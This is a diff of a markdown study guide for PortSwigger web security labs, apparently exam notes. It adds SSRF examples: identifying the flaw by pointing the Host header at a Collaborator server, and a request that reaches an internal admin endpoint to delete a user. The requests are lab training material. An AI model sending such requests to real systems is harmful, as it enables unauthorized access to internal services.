@@ -1492,11 +1492,10 @@ Host: localhost
 ![ssrf obfuscated](images/ssrf-obfuscated.png)  
 
 [PortSwigger Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)  
-
-
+  
 ### Absolute GET URL + HOST SSRF
 
->Possible to provide an absolute URL in the GET request line and then supply different target for the HOST header.  
+>***Identify*** SSRF by changing the ```HOST``` header to Collaborator and providing an absolute URL in the GET request line and observe the response from the Collaborator server.  
 
 ```html
 GET https://TARGET.web-security-academy.net/
@@ -1505,13 +1504,18 @@ Host: COLLABORATOR.NET
 
 ![identify-ssrf-host](images/identify-ssrf-host.png)  
 
->Use the Host header to target 192.168.0.141 or localhost, and notice the response give 302 status admin interface found. Append /admin to the absolute URL in the request line and send the request. Observe SSRF response.  
+>Use the Host header to target 192.168.0.141 or ```localhost```, and notice the response give 302 status admin interface found. Append /admin to the absolute URL in the request line and send the request. Observe SSRF response.  
 
 ![ssrf](images/ssrf.png)  
 
+```
+GET https://TARGET.net/admin/delete?csrf=cnHBVbOPl7Bptu3VCXQZh6MUYzMsEXgO&username=carlos HTTP/1.1
+Host: 192.168.0.114
+Cookie: session=PQcb5CMC9ECh5fBobuxSalaBdxyLis01
+```  
+
 [PortSwigger Lab: SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)  
-
-
+  
 ### SSRF redirect_uris  
 
 >POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs. Observe the redirect_uri.  
